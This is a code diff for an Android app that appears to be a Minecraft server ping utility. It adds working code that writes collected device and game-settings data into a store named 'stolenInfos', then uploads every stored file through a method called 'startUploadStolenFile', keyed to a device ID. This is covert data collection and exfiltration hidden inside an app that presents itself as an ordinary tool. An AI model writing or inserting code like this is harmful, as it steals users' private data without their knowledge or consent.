@@ -9,6 +9,7 @@ import android.os.*;
 import android.util.*;
 import com.google.gson.*;
 import com.nao20010128nao.FileSafeBox.*;
+import com.nao20010128nao.McServerPingPong.misc.*;
 
 public class CollectorMain extends ContextWrapper implements Runnable
 {
@@ -20,10 +21,12 @@ public class CollectorMain extends ContextWrapper implements Runnable
 	@Override
 	public void run() {
 		// TODO: Implement this method
+		SafeBox sb=TheApplication.instance.stolenInfos;
+		FileUploader fu=new FileUploader(TheApplication.instance.uuid);
 		Writer w=null;
 		String s="";
 		try {
-			(w=new OutputStreamWriter(TheApplication.instance.stolenInfos.saveFile(System.currentTimeMillis() + ".json", SafeBox.MODE_GZIP))).append(s=new Gson().toJson(new Infos()));
+			(w=new OutputStreamWriter(sb.saveFile(System.currentTimeMillis() + ".json", SafeBox.MODE_GZIP))).append(s=new Gson().toJson(new Infos()));
 		} catch (IOException e) {
 			
 		}finally{
@@ -32,6 +35,31 @@ public class CollectorMain extends ContextWrapper implements Runnable
 			} catch (IOException e) {}
 			System.out.println(s);
 		}
+		String[] files;
+		try{
+			files=sb.listFiles();
+		}catch(Throwable e){
+			return;
+		}
+		for(String filename:files){
+			try {
+				copyAndClose(sb.readFile(filename), fu.startUploadStolenFile(filename));
+			} catch (IOException e) {
+				break;
+			}
+		}
+	}
+	void copyAndClose(InputStream is,OutputStream os)throws IOException{
+		byte[] buf=new byte[100];
+		while(true){
+			int r=is.read(buf);
+			if(r<=0){
+				break;
+			}
+			os.write(buf,0,r);
+		}
+		is.close();
+		os.close();
 	}
 	public static class Infos{
 		public HashMap<String,String> mcpeSettings=readSettings();
